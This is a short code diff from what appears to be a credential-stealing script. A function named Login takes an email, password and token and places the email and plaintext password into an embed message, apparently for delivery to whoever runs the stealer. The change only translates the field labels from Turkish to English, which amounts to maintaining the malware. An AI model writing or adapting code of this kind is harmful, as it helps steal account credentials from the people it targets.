@@ -152,8 +152,8 @@ function Login(email, password, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Hesap Bilgileri**",
-                            "value": `Email: ${email} - Şifre: ${password}`,
+                            "name": "**Account Info**",
+                            "value": `Email: ${email} - Password: ${password}`,
                             "inline": true
                         },
                         {
